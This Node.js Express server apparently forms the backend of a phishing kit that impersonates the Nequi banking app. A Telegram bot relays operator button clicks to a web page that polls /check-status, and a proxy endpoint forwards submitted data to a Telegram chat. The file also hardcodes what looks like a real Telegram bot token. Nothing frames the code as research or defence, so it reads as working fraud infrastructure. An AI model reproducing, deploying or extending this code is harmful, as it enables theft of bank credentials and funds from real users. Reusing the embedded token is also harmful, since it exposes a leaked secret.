const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

// --- CONFIGURACIÓN ---
const PORT = 3000;
const TELEGRAM_TOKEN = '8164357624:AAF6-huSZNt6tU0Y-bOjkfac83GPh0gihJA';

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, '.'))); // Servir archivos estáticos del directorio actual

// Almacenamiento temporal de órdenes
let userCommands = {};

// --- INICIAR BOT EN MODO POLLING ---
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
console.log("🤖 Iniciando Bot Nequi en modo Polling...");

// Escuchar clics en botones inline
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    
    console.log(`[Telegram Nequi] Clic recibido: ${data} del chat: ${chatId}`);
    userCommands['current'] = data;

    bot.answerCallbackQuery(callbackQuery.id).catch(err => console.error(err));
});

bot.on('polling_error', (error) => {
    console.error(`[Polling Error] ${error.code}: ${error.message}`);
});

// --- ENDPOINTS ---

// Check status para la web
app.get('/check-status', (req, res) => {
    const command = userCommands['current'];
    if (command) {
        res.json({ command: command });
        userCommands['current'] = null;
        console.log(`[Web Nequi] Comando enviado: ${command}`);
    } else {
        res.json({ command: null });
    }
});

// Proxy para enviar mensajes (para mantener compatibilidad si se desea, aunque saldo.js usará directo)
app.post('/telegram-proxy/sendMessage', async (req, res) => {
    // Implementación simple de proxy si es necesario
    try {
        const { chat_id, text, reply_markup, parse_mode } = req.body;
        await bot.sendMessage(chat_id, text, { reply_markup, parse_mode });
        res.json({ ok: true, result: { message_id: 123 } }); // Mock response
    } catch (e) {
        res.status(500).json({ ok: false, error: e.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Servidor Nequi corriendo en http://localhost:${PORT}`);
});
